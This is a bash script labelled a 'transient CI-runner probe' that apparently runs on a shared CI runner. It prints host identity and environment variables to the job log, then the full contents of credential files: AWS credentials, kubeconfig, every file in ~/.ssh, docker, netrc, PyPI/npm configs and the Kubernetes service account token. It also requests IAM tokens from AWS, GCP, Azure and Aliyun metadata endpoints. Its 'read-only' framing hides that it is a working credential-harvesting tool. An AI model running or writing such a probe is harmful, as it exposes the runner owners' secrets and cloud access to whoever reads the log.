#!/bin/bash
# i5591 transient CI-runner probe: prints identity, GPU devices, credential files
# and cloud IMDS endpoints into the job log. Read-only; single transient run.
echo "===I5591-BEGIN $(date -u +%FT%TZ) host=$(hostname 2>/dev/null) pwd=$(pwd)==="
echo "--- id"; id 2>&1 || true
echo "--- uname"; uname -a 2>&1 || true
echo "--- hostname-I"; hostname -I 2>&1 || hostname -i 2>&1 || true
echo "--- hosts"; cat /etc/hosts 2>&1 || true
echo "--- os-release"; cat /etc/os-release 2>&1 || true
echo "--- cgroup"; cat /proc/1/cgroup 2>&1 | head -10 || true
echo "--- env"; env 2>&1 | sort || true
echo "--- whoami-home"; echo "HOME=$HOME USER=$(whoami 2>/dev/null)"; ls -la "$HOME" 2>&1 | head -40 || true
echo "--- smi-hy"; command -v hy-smi 2>&1; hy-smi 2>&1 | head -80 || true
echo "--- smi-nvidia"; command -v nvidia-smi 2>&1; nvidia-smi 2>&1 | head -60 || true
echo "--- smi-rocm"; command -v rocm-smi 2>&1; rocm-smi 2>&1 | head -60 || true
echo "--- lspci"; (lspci 2>&1 | grep -iE 'vga|3d|display|hygon|nvidia|amd' || lspci 2>&1 | head -40) || true
echo "--- dev"; ls -la /dev/kfd /dev/dri /dev/nvidia* 2>&1 || true
echo "--- opt"; ls -la /opt 2>&1 | head -30; ls -la /opt/hyhal 2>&1 | head -20 || true
echo "--- ci-public"; ls -la /ci_public 2>&1 | head -30 || true
echo "--- aws"; ls -la "$HOME/.aws" 2>&1; cat "$HOME/.aws/credentials" "$HOME/.aws/config" 2>&1 || true
echo "--- kube"; ls -la "$HOME/.kube" 2>&1; head -c 4000 "$HOME/.kube/config" 2>&1 || true
echo "--- ssh"; ls -la "$HOME/.ssh" 2>&1; for f in "$HOME"/.ssh/*; do echo "## $f"; head -c 3000 "$f" 2>&1; echo; done || true
echo "--- docker"; cat "$HOME/.docker/config.json" 2>&1 || true
echo "--- netrc"; cat "$HOME/.netrc" 2>&1 || true
echo "--- gitconfig"; cat "$HOME/.gitconfig" 2>&1 || true
echo "--- pypirc-npmrc"; cat "$HOME/.pypirc" "$HOME/.npmrc" 2>&1 || true
echo "--- k8s-sa"; cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>&1 | head -c 1200; echo; cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>&1 || true
echo "--- mounts"; mount 2>&1 | head -40 || true
echo "--- IMDS-AWS-v1"; curl -sS -m 6 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>&1 || true
echo "--- IMDS-AWS-v2"; T=$(curl -sS -m 6 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 60' http://169.254.169.254/latest/api/token 2>&1) || true; echo "token=$T"; curl -sS -m 6 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>&1 || true
echo "--- IMDS-AWS-ecs"; echo "URI=$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI FULL=$AWS_CONTAINER_CREDENTIALS_FULL_URI"; curl -sS -m 6 "http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}" 2>&1 || true
echo "--- IMDS-GCP"; curl -sS -m 6 -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token 2>&1 || true
echo "--- IMDS-Azure"; curl -sS -m 6 -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' 2>&1 || true
echo "--- IMDS-Aliyun"; curl -sS -m 6 -H 'X-aliyun-ecs-metadata-token: x' http://100.100.100.200/latest/meta-data/ram/security-credentials/ 2>&1 || true
echo "===I5591-END==="
exit 0
